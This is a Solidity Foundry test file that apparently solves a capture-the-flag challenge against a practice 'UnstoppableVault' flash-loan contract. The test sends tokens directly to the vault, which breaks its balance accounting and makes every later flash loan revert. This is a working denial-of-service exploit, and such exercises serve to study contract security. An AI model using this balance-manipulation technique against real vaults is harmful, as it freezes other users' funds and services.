// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/UnstoppableVault.sol";
import "../src/ReceiverUnstoppable.sol";
import {console} from "forge-std/console.sol";
import { ERC20 } from "solmate/src/tokens/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT", 18) {
        
    }

    function mint(address _recipient, uint256 amount) public {
        _mint(_recipient, amount);
    }
}

contract RetirementFundTest is Test {
    UnstoppableVault unstoppableVault;
    ReceiverUnstoppable receiverUnstoppable;
    TestToken testToken;
    address user1 = vm.addr(1);
    address user2 = vm.addr(2);
    
    
    function setUp() public {
        // Deploy contracts
        vm.deal(user1, 200 ether);
        vm.deal(user2, 200 ether);
        vm.startPrank(user1);

        testToken = new TestToken();
        unstoppableVault = new UnstoppableVault(ERC20(address(testToken)), user1, user2);
        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableVault));
        vm.deal(address(receiverUnstoppable), 200 ether);

        testToken.mint(address(user1), 1_000_000 ether);
        ERC20(testToken).approve(address(unstoppableVault), 1_000_000 ether);
        unstoppableVault.deposit(1_000_000 ether, user1);
        testToken.mint(address(receiverUnstoppable), 100 ether);
        testToken.mint(user1, 100 ether);
    }

    function testIncrement() public {
        // Test your Exploit Contract below
        // check start condition
        vm.startPrank(user1);

        bool success = receiverUnstoppable.executeFlashLoan(1000);
        assertTrue(success, "Flash loan must succeed");

        // change balance of contract
        testToken.transfer(address(unstoppableVault), 2 ether);

    
        vm.expectRevert(bytes4(keccak256("InvalidBalance()")));
        receiverUnstoppable.executeFlashLoan(1000);
    }

    receive() external payable {}
}